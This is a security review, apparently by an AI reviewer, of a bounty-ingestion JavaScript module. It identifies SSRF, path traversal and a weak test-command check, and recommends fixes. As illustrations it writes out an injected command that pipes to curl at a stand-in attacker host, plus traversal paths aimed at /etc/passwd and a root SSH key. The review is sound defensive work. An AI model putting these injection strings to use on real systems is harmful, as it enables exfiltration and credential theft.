# Architectural Critique: Bounty/Opportunity Lane Hardening
**Target:** `lib/bounty_hunter_engine.mjs`
**Reviewer:** Qwen-2.5-Coder (Dizzy Council)

## 1. Overview
The `bounty_hunter_engine.mjs` file orchestrates the ingestion, triage, and task-generation for external bounties (e.g., SWE-Bench tasks, OSS bounties). While it implements basic sanitization (stripping prompt injections and simple shell commands), its ingress boundary and artifact handling mechanisms lack robust cryptographic and structural boundaries, leaving the system vulnerable to SSRF, path traversal, and supply chain attacks.

## 2. Ingress Security & Domain Allowlists
Currently, the `parseBountyTask` function blindly accepts the `sourceUrl` and `repository` fields:
```javascript
const safeRepo = String(repository || "unknown/repo").trim();
const safeSourceUrl = String(sourceUrl || "").trim().slice(0, 500);
```
**Vulnerability:** 
- If the downstream system automatically fetches `sourceUrl` or clones `repository`, an attacker can provide internal IP addresses (leading to SSRF) or host a malicious git repository that exploits git vulnerabilities or includes backdoored test scripts.

**Recommendation:**
- Implement a **Domain Allowlist Middleware**. URLs and Repository strings must be parsed and strictly validated against a hardcoded list of trusted domains (e.g., `github.com`, `gitlab.com`, `hackerone.com`).
- Reject outright any URL attempting to use non-standard ports or schemas (allow only `https://`).

## 3. Safe Offline Artifact Handling (Files)
The `target_files` list is cleaned using a generic string length function:
```javascript
const safeFiles = cleanList(files, { maxItems: 64, maxChars: 260 });
```
**Vulnerability:**
- No path traversal (`../`) checks are performed. An attacker could specify `target_files: ["../../../etc/passwd", "../../../root/.ssh/id_rsa"]`, and if the StateM execution modifies or reads these files, it compromises the host.

**Recommendation:**
- Implement a **Jailed Path Sanitizer**. 
- Validate that all `files` are strictly relative paths.
- Block any paths containing `..`, starting with `/`, or containing shell variables (`$HOME`).
- Ensure the StateM runner uses an ephemeral, offline chroot/container to operate on these artifacts.

## 4. Test Command Parsing Weakness
The `test_command` validation in `createBountyStateMRunbook`:
```javascript
const isAllowed = rawCommand && rawCommand.split(/\s*(?:&&|;)\s*/g).every((c) => ALLOWED_VERIFICATION_COMMANDS.includes(c.trim()));
```
**Vulnerability:**
- The regex `/\s*(?:&&|;)\s*/g` misses other command operators like `||`, `|`, `&`, and subshells `$(...)`. An attacker could supply `npm test || curl http://attacker.com/leak`.

**Recommendation:**
- Do not attempt to parse and split shell commands with regex. 
- Either require the *entire* `test_command` string to exactly match an entry in `ALLOWED_VERIFICATION_COMMANDS`, or transition to a purely declarative verification configuration (e.g., specifying only the test framework and targets, not the raw bash string).

## 5. Summary of Action Items
1. Add `ALLOWED_DOMAINS` array and enforce it on `sourceUrl` and `repository`.
2. Add a `sanitizeArtifactPath(filePath)` function to reject directory traversal and absolute paths.
3. Fix the `test_command` check to strictly match the allowlist without regex splitting, or reject metacharacters (`|`, `&`, `$`, `<`, `>`).
4. Ensure the actual build/test process for these artifacts happens in an offline, network-isolated container.
